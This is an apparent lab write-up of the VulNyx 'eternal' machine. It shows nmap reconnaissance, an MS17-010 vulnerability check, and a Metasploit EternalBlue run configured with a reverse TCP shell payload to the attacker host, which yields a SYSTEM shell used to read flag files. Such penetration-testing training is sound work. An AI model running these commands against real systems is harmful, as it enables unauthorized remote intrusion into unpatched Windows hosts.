# eternal

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| eternal | d4t4s3c | Low | VulNyx |

**Summary:** The eternal machine was a Windows 7 Enterprise Service Pack 1 host exposing Microsoft RPC, NetBIOS, SMB, and Microsoft HTTPAPI services. SMB enumeration identified the computer as `MIKE-PC`, confirmed the Windows 7 SP1 build, and showed that SMB message signing was not required. A targeted vulnerability check with Nmap confirmed that the SMBv1 service was vulnerable to MS17 010, tracked as CVE 2017 0143, the EternalBlue remote code execution flaw. Metasploit's `ms17_010_eternalblue` module was configured with a 64 bit reverse shell payload and used against port 445. The exploit validated the target, performed non paged pool grooming, completed the ETERNALBLUE overwrite, and opened a command shell as `nt authority\system`. Because exploitation landed directly in the Windows SYSTEM context, no separate privilege escalation step was needed, and the resulting shell was used to access the user and root flag files from Mike's desktop.

---

## Reconnaissance

The assessment began with host discovery on the local lab network, followed by full TCP enumeration of the identified Windows target.

1. An Nmap ping sweep found the target at `192.168.56.127`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:42 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00033s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.00089s latency).
MAC Address: 08:00:27:C1:85:DA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.127 (192.168.56.127)
Host is up (0.0010s latency).
MAC Address: 08:00:27:2D:82:77 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.10 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.127
```

2. A full TCP scan revealed SMB related ports and several high dynamic RPC ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=5000 -Pn $ip   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:42 -0400
Nmap scan report for 192.168.56.127 (192.168.56.127)
Host is up (0.0010s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:2D:82:77 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
```

3. Service and script detection identified the host as Windows 7 Enterprise Service Pack 1:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 135,139,445,5357 -sC -sV -T4 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:44 -0400
Nmap scan report for 192.168.56.127 (192.168.56.127)
Host is up (0.00090s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
MAC Address: 08:00:27:2D:82:77 (Oracle VirtualBox virtual NIC)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h19m57s, deviation: 1h09m16s, median: 5h59m57s
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2d:82:77 (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-16T13:44:47+02:00
| smb2-time: 
|   date: 2026-08-16T11:44:47
|_  start_date: 2026-08-16T11:42:09
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds
```

The service fingerprint and SMB scripts confirmed an unpatched Windows 7 SP1 system with SMBv1 exposure.

---

## Vulnerability Discovery

### MS17 010 Detection

4. The Nmap MS17 010 script was executed against SMB port 445:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap --script smb-vuln-ms17-010 -p445 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-16 01:45 -0400
Nmap scan report for 192.168.56.127 (192.168.56.127)
Host is up (0.00051s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:2D:82:77 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds
```

The result confirmed that the target was vulnerable to MS17 010, making EternalBlue the direct exploitation path.

---

## Initial Access

### EternalBlue Exploitation

5. Metasploit was launched, the EternalBlue module was selected, and the exploit was configured with a 64 bit reverse command shell payload:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ msfconsole -q
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell_reverse_tcp 
PAYLOAD => windows/x64/shell_reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.56.127
RHOSTS => 192.168.56.127
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.56.104
LHOST => 192.168.56.104
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] 192.168.56.127:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.56.127:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.29/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.56.127:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.56.127:445 - The target is vulnerable.
[*] 192.168.56.127:445 - Connecting to target for exploitation.
[+] 192.168.56.127:445 - Connection established for exploitation.
[+] 192.168.56.127:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.56.127:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.56.127:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 192.168.56.127:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 192.168.56.127:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.56.127:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.56.127:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.56.127:445 - Sending all but last fragment of exploit packet
[*] 192.168.56.127:445 - Starting non-paged pool grooming
[+] 192.168.56.127:445 - Sending SMBv2 buffers
[+] 192.168.56.127:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.56.127:445 - Sending final SMBv2 buffers.
[*] 192.168.56.127:445 - Sending last fragment of exploit packet!
[*] 192.168.56.127:445 - Receiving response from exploit packet
[+] 192.168.56.127:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.56.127:445 - Sending egg to corrupted connection.
[*] 192.168.56.127:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.127:49158) at 2026-08-16 01:49:35 -0400
[+] 192.168.56.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.56.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.56.127:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Versi_n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system
```

The shell opened as `nt authority\system`, confirming immediate execution in the highest local privilege context.

---

## Flag Retrieval

### Reading Desktop Flags

6. The SYSTEM shell was used to read both flag files from `C:\Users\MIKE\Desktop`:

```powershell
C:\Users\MIKE\Desktop>type user.txt root.txt
type user.txt root.txt

user.txt


 

root.txt


 
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery identified `192.168.56.127`, and TCP scanning exposed Windows RPC, NetBIOS, SMB, Microsoft HTTPAPI, and dynamic RPC ports.

2. **Vulnerability Discovery**: SMB service detection identified Windows 7 Enterprise SP1, and the `smb-vuln-ms17-010` script confirmed the host was vulnerable to EternalBlue.

3. **Exploitation**: Metasploit's `exploit/windows/smb/ms17_010_eternalblue` module exploited SMBv1 and opened a reverse command shell.

4. **Internal Enumeration**: The resulting shell was validated with `whoami`, confirming execution as `nt authority\system`.

5. **Privilege Escalation**: No separate escalation was required because EternalBlue executed code in the privileged kernel backed SMB service context, yielding immediate SYSTEM access.
